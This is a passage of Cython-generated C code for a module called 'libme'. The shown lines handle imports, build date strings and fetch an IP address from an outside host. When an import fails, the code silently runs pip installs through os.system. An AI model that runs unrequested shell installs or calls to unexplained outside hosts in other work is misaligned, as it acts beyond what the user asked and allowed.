      /* "libme.pyx":36
 * 	os.system("pip  install bs4")
 * try:
 * 	import concurrent.futures             # <<<<<<<<<<<<<<
 * except ImportError:
 * 	print("\n ! james futures module not installed")
 */
      __pyx_t_1 = __Pyx_Import(__pyx_n_s_concurrent_futures, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 36, __pyx_L18_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_concurrent, __pyx_t_1) < 0) __PYX_ERR(0, 36, __pyx_L18_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":35
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")
 * try:             # <<<<<<<<<<<<<<
 * 	import concurrent.futures
 * except ImportError:
 */
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L23_try_end;
    __pyx_L18_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":37
 * try:
 * 	import concurrent.futures
 * except ImportError:             # <<<<<<<<<<<<<<
 * 	print("\n ! james futures module not installed")
 * 	os.system("pip install futures")
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ImportError);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_7) < 0) __PYX_ERR(0, 37, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_7);

      /* "libme.pyx":38
 * 	import concurrent.futures
 * except ImportError:
 * 	print("\n ! james futures module not installed")             # <<<<<<<<<<<<<<
 * 	os.system("pip install futures")
 * ct = datetime.now()
 */
      if (__Pyx_PrintOne(0, __pyx_kp_s_james_futures_module_not_instal) < 0) __PYX_ERR(0, 38, __pyx_L20_except_error)

      /* "libme.pyx":39
 * except ImportError:
 * 	print("\n ! james futures module not installed")
 * 	os.system("pip install futures")             # <<<<<<<<<<<<<<
 * ct = datetime.now()
 * n = ct.month
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 39, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 39, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 39, __pyx_L20_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L19_exception_handled;
    }
    goto __pyx_L20_except_error;
    __pyx_L20_except_error:;

    /* "libme.pyx":35
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")
 * try:             # <<<<<<<<<<<<<<
 * 	import concurrent.futures
 * except ImportError:
 */
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L19_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L23_try_end:;
  }

  /* "libme.pyx":40
 * 	print("\n ! james futures module not installed")
 * 	os.system("pip install futures")
 * ct = datetime.now()             # <<<<<<<<<<<<<<
 * n = ct.month
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_datetime); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ct, __pyx_t_7) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "libme.pyx":41
 * 	os.system("pip install futures")
 * ct = datetime.now()
 * n = ct.month             # <<<<<<<<<<<<<<
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ct); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_month); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_n, __pyx_t_2) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":42
 * ct = datetime.now()
 * n = ct.month
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]             # <<<<<<<<<<<<<<
 * try:
 * 	if n < 0 or n > 12:
 */
  __pyx_t_2 = PyList_New(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_January);
  __Pyx_GIVEREF(__pyx_n_s_January);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_January);
  __Pyx_INCREF(__pyx_n_s_February);
  __Pyx_GIVEREF(__pyx_n_s_February);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_n_s_February);
  __Pyx_INCREF(__pyx_n_s_March);
  __Pyx_GIVEREF(__pyx_n_s_March);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_n_s_March);
  __Pyx_INCREF(__pyx_n_s_April);
  __Pyx_GIVEREF(__pyx_n_s_April);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_n_s_April);
  __Pyx_INCREF(__pyx_n_s_May);
  __Pyx_GIVEREF(__pyx_n_s_May);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_n_s_May);
  __Pyx_INCREF(__pyx_n_s_June);
  __Pyx_GIVEREF(__pyx_n_s_June);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_n_s_June);
  __Pyx_INCREF(__pyx_n_s_July);
  __Pyx_GIVEREF(__pyx_n_s_July);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_n_s_July);
  __Pyx_INCREF(__pyx_n_s_August);
  __Pyx_GIVEREF(__pyx_n_s_August);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_n_s_August);
  __Pyx_INCREF(__pyx_n_s_September);
  __Pyx_GIVEREF(__pyx_n_s_September);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_n_s_September);
  __Pyx_INCREF(__pyx_n_s_October);
  __Pyx_GIVEREF(__pyx_n_s_October);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_n_s_October);
  __Pyx_INCREF(__pyx_n_s_November);
  __Pyx_GIVEREF(__pyx_n_s_November);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_n_s_November);
  __Pyx_INCREF(__pyx_n_s_December);
  __Pyx_GIVEREF(__pyx_n_s_December);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_n_s_December);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan, __pyx_t_2) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":43
 * n = ct.month
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:             # <<<<<<<<<<<<<<
 * 	if n < 0 or n > 12:
 * 		exit()
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":44
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:
 * 	if n < 0 or n > 12:             # <<<<<<<<<<<<<<
 * 		exit()
 * 	nTemp = n - 1
 */
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_n); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = PyObject_RichCompare(__pyx_t_2, __pyx_int_0, Py_LT); __Pyx_XGOTREF(__pyx_t_7); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_7); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (!__pyx_t_11) {
      } else {
        __pyx_t_10 = __pyx_t_11;
        goto __pyx_L33_bool_binop_done;
      }
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_n); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_2 = PyObject_RichCompare(__pyx_t_7, __pyx_int_12, Py_GT); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 44, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_10 = __pyx_t_11;
      __pyx_L33_bool_binop_done:;
      if (__pyx_t_10) {

        /* "libme.pyx":45
 * try:
 * 	if n < 0 or n > 12:
 * 		exit()             # <<<<<<<<<<<<<<
 * 	nTemp = n - 1
 * except ValueError:
 */
        __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L26_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        /* "libme.pyx":44
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:
 * 	if n < 0 or n > 12:             # <<<<<<<<<<<<<<
 * 		exit()
 * 	nTemp = n - 1
 */
      }

      /* "libme.pyx":46
 * 	if n < 0 or n > 12:
 * 		exit()
 * 	nTemp = n - 1             # <<<<<<<<<<<<<<
 * except ValueError:
 * 	exit()
 */
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_n); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = __Pyx_PyInt_SubtractObjC(__pyx_t_2, __pyx_int_1, 1, 0, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 46, __pyx_L26_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_nTemp, __pyx_t_7) < 0) __PYX_ERR(0, 46, __pyx_L26_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "libme.pyx":43
 * n = ct.month
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:             # <<<<<<<<<<<<<<
 * 	if n < 0 or n > 12:
 * 		exit()
 */
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L31_try_end;
    __pyx_L26_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    /* "libme.pyx":47
 * 		exit()
 * 	nTemp = n - 1
 * except ValueError:             # <<<<<<<<<<<<<<
 * 	exit()
 * current = datetime.now()
 */
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 47, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);

      /* "libme.pyx":48
 * 	nTemp = n - 1
 * except ValueError:
 * 	exit()             # <<<<<<<<<<<<<<
 * current = datetime.now()
 * ta = current.year
 */
      __pyx_t_8 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 48, __pyx_L28_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L27_exception_handled;
    }
    goto __pyx_L28_except_error;
    __pyx_L28_except_error:;

    /* "libme.pyx":43
 * n = ct.month
 * bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
 * try:             # <<<<<<<<<<<<<<
 * 	if n < 0 or n > 12:
 * 		exit()
 */
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L27_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L31_try_end:;
  }

  /* "libme.pyx":49
 * except ValueError:
 * 	exit()
 * current = datetime.now()             # <<<<<<<<<<<<<<
 * ta = current.year
 * bu = current.month
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_datetime); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_now); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_current, __pyx_t_1) < 0) __PYX_ERR(0, 49, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":50
 * 	exit()
 * current = datetime.now()
 * ta = current.year             # <<<<<<<<<<<<<<
 * bu = current.month
 * ha = current.day
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_current); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_year); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ta, __pyx_t_2) < 0) __PYX_ERR(0, 50, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":51
 * current = datetime.now()
 * ta = current.year
 * bu = current.month             # <<<<<<<<<<<<<<
 * ha = current.day
 * op = bulan[nTemp]
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_current); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_month); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bu, __pyx_t_1) < 0) __PYX_ERR(0, 51, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":52
 * ta = current.year
 * bu = current.month
 * ha = current.day             # <<<<<<<<<<<<<<
 * op = bulan[nTemp]
 * 
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_current); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_day); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ha, __pyx_t_2) < 0) __PYX_ERR(0, 52, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":53
 * bu = current.month
 * ha = current.day
 * op = bulan[nTemp]             # <<<<<<<<<<<<<<
 * 
 * my_date = date.today()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_bulan); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_nTemp); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_op, __pyx_t_7) < 0) __PYX_ERR(0, 53, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "libme.pyx":55
 * op = bulan[nTemp]
 * 
 * my_date = date.today()             # <<<<<<<<<<<<<<
 * hr = calendar.day_name[my_date.weekday()]
 * date = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_date); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_today); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_my_date, __pyx_t_7) < 0) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  /* "libme.pyx":56
 * 
 * my_date = date.today()
 * hr = calendar.day_name[my_date.weekday()]             # <<<<<<<<<<<<<<
 * date = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 * date = ("%s %s %s"%(ha, op, ta))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_calendar); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_day_name); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_my_date); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_weekday); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetItem(__pyx_t_1, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hr, __pyx_t_2) < 0) __PYX_ERR(0, 56, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":57
 * my_date = date.today()
 * hr = calendar.day_name[my_date.weekday()]
 * date = ("%s-%s-%s-%s"%(hr, ha, op, ta))             # <<<<<<<<<<<<<<
 * date = ("%s %s %s"%(ha, op, ta))
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_hr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ha); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_op); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ta); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_9 = PyTuple_New(4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_9, 1, __pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_9, 2, __pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_9, 3, __pyx_t_8);
  __pyx_t_2 = 0;
  __pyx_t_7 = 0;
  __pyx_t_1 = 0;
  __pyx_t_8 = 0;
  __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_s_s_s_s, __pyx_t_9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_8) < 0) __PYX_ERR(0, 57, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /* "libme.pyx":58
 * hr = calendar.day_name[my_date.weekday()]
 * date = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 * date = ("%s %s %s"%(ha, op, ta))             # <<<<<<<<<<<<<<
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 */
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_ha); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_op); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_9);
  PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_9);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_t_1);
  __pyx_t_8 = 0;
  __pyx_t_9 = 0;
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyString_Format(__pyx_kp_s_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_date, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":59
